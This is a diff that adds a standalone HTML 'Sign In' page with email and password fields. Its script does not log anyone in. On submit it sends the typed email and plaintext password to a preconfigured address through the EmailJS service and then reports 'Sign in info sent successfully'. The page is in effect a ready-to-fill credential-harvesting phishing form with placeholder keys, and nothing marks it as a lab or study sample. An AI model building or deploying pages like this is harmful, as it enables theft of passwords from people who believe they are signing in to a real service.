@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Sign In</title>
+<!-- EmailJS SDK -->
+<script src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    /* Set a background image */
+    background-image: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb'); /* Replace with your image URL */
+    background-size: cover;
+    background-position: center;
+  }
+  .signin-container {
+    background: rgba(255, 255, 255, 0.9);
+    padding: 2rem;
+    border-radius: 8px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+    width: 320px;
+  }
+  .signin-container h2 {
+    margin-bottom: 1rem;
+    color: #002b45;
+  }
+  label {
+    display: block;
+    margin-bottom: 0.3rem;
+    font-weight: bold;
+    font-size: 0.9rem;
+    color: #004263;
+  }
+  input[type="email"],
+  input[type="password"] {
+    width: 100%;
+    padding: 0.5rem;
+    margin-bottom: 1rem;
+    border: 1px solid #cbd1d8;
+    border-radius: 4px;
+    font-size: 1rem;
+  }
+  button {
+    width: 100%;
+    background-color: #0078d2;
+    color: white;
+    padding: 0.6rem;
+    border: none;
+    border-radius: 4px;
+    font-size: 1rem;
+    cursor: pointer;
+  }
+  button:hover {
+    background-color: #005ea3;
+  }
+  .message {
+    margin-top: 1rem;
+    font-size: 0.9rem;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+
+<div class="signin-container">
+  <h2>Sign In</h2>
+  <form id="signin-form">
+    <label for="user_email">Email</label>
+    <input type="email" id="user_email" name="user_email" required />
+
+    <label for="user_password">Password</label>
+    <input type="password" id="user_password" name="user_password" required />
+
+    <button type="submit">Sign In</button>
+  </form>
+  <div class="message" id="form-message"></div>
+</div>
+
+<script>
+  // Initialize EmailJS with your user ID from your EmailJS dashboard
+  (function(){
+    emailjs.init("YOUR_EMAILJS_PUBLIC_KEY");
+  })();
+
+  const form = document.getElementById('signin-form');
+  const messageEl = document.getElementById('form-message');
+
+  form.addEventListener('submit', function(event) {
+    event.preventDefault();
+    const templateParams = {
+      user_email: form.user_email.value,
+      user_password: form.user_password.value
+    };
+    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
+      .then(function(response) {
+        messageEl.textContent = "Sign in info sent successfully!";
+        messageEl.style.color = "green";
+        form.reset();
+      }, function(error) {
+        messageEl.textContent = "Failed to send sign in info. Try again.";
+        messageEl.style.color = "red";
+      });
+  });
+</script>
+
+</body>
+</html>
